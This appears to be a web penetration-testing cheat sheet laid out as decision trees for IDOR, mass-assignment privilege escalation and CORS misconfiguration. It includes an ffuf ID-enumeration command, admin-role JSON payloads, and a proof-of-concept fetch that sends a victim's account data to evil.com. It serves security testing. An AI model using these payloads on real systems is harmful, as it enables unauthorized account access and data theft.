### IDOR (Insecure Direct Object Reference)

- `->` **[Primary Probe]** Enumerate all numeric/UUID object references in path (`/api/users/1234`) and body params; use Burp Intruder with `Authz` extension to replay requests under different session cookies [infosecwriteups](https://infosecwriteups.com/how-i-uncover-an-idor-led-to-access-private-cv-access-3ff5be987896)
  - `->` **[Signal: Cross-account data returned]** → Confirm with `diff` of two account responses; escalate to write operations (PUT/DELETE with victim ID)
  - `->` **[Dead End: Opaque UUIDs]** → Harvest other users' UUIDs from public activity feeds, email headers (`X-User-Id`), API error messages, JS variable dumps
  - `->` **[Dead End: Request returns 403]** → Second-order IDOR: set victim UUID in benign field (profile picture URL, notification preference), trigger indirect access endpoint
  - `->` **[Dead End: Response identical regardless of ID]** → Mass-enumerate with ffuf: `ffuf -u https://target/api/doc/FUZZ -w ids.txt -H "Cookie: victim_sess" -mc 200` — compare content length
  - `->` **[Data Chaining]** Leaked admin UUID → use in privilege escalation endpoint → `PATCH /api/users/<admin-uuid>/role` with `{"role":"admin"}`

### Privilege Escalation / Mass Assignment

- `->` **[Primary Probe]** Capture account-update request; add undocumented keys via JSON fuzzing: `{"role":"admin","isAdmin":true,"plan":"enterprise","credits":9999}` [strobes](https://strobes.co/blog/web-application-penetration-testing-tools/)
  - `->` **[Signal: Role/attribute silently promoted]** → Confirm by re-fetching profile; escalate to sensitive function access
  - `->` **[Dead End: Unknown keys rejected]** → Source-mine JS bundles: `grep -Eo '"[a-zA-Z_]+"' app.js | sort -u > keys.txt` → replay with discovered internal keys
  - `->` **[Dead End: API strictly validates schema]** → Try HTTP method override: add `X-HTTP-Method-Override: PATCH` on a POST request to a read-only endpoint

### CORS Misconfiguration

- `->` **[Primary Probe]** Add `Origin: https://evil.com` header to all authenticated API requests; check response for `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Signal: Reflected origin with credentials]** → PoC XS-leak JS:
    ```javascript
    fetch('https://target/api/me',{credentials:'include'})
    .then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))
    ```
  - `->` **[Dead End: Whitelist enforced]** → Try null origin: `Origin: null` (sandboxed iframe trick), subdomain variations: `Origin: https://target.evil.com`
  - `->` **[Dead End: Credentials not forwarded]** → CORS without credentials still exposes internal API structure, internal hostnames, non-public data with predictable non-sensitive leakage chaining to info disclosure
  - `->` **[Data Chaining]** CORS leak exposes internal API hostname → new SSRF probe target

***
